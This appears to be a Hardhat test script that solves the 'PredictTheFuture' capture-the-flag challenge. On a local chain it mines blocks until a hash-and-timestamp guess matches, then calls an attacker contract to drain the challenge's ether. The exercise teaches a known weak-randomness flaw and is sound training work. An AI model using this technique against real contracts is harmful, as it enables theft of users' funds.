import { ethers } from "hardhat";
import { expect } from "chai";

describe("PredictTheFutureChallenge", function () {
  it("should solve the challenge using attacker contract", async () => {
    const [attacker] = await ethers.getSigners();
    const guess = 7;

    // 1. Deploy challenge with 1 ETH
    const ChallengeFactory = await ethers.getContractFactory("PredictTheFutureChallenge");
    const challenge = await ChallengeFactory.connect(attacker).deploy({
      value: ethers.utils.parseEther("1.0"),
    });

    // 2. Deploy attacker contract with 1 ETH
    const AttackerFactory = await ethers.getContractFactory("PredictTheFutureAttacker");
    const attackerContract = await AttackerFactory.connect(attacker).deploy(challenge.address, {
      value: ethers.utils.parseEther("1.0"),
    });

    // 3. Lock in the guess
    const lockTx =await attackerContract.lockGuess(7);
    await lockTx.wait();
    console.log(" Guess locked with:", guess);

    let solved = false;
    let attempts = 0;

    while (!solved && attempts < 256) {
      await network.provider.send("evm_mine"); // new block

      const block = await ethers.provider.getBlock("latest");
      const hash = block.hash;
      const timestamp = block.timestamp;

      const packed = ethers.utils.solidityPack(["bytes32", "uint256"], [hash, timestamp]);
      const predicted = BigInt(ethers.utils.keccak256(packed)) % 10n;

      console.log(`🔁 Block #${block.number} | predicted: ${predicted}`);

      if (predicted === BigInt(guess)) {
        console.log(` Match found with guess ${guess}! Settling...`);
        const tx = await attackerContract.attack();
        await tx.wait();
        // Withdraw after successful solve

        // Confirm balance transferred (optional)
        const attackerBalance = await ethers.provider.getBalance(attacker.address);
        console.log("EOA attacker balance after withdrawal:", ethers.utils.formatEther(attackerBalance));
        const victimBalance = await ethers.provider.getBalance(challenge.address);
        console.log("Vicntim balance after withdrawal:", ethers.utils.formatEther(victimBalance));
        solved = true;
      }

      attempts++;
    }

    const isComplete = await challenge.isComplete();
    expect(isComplete).to.equal(true);
    console.log("Challenge solved!");
  });
});
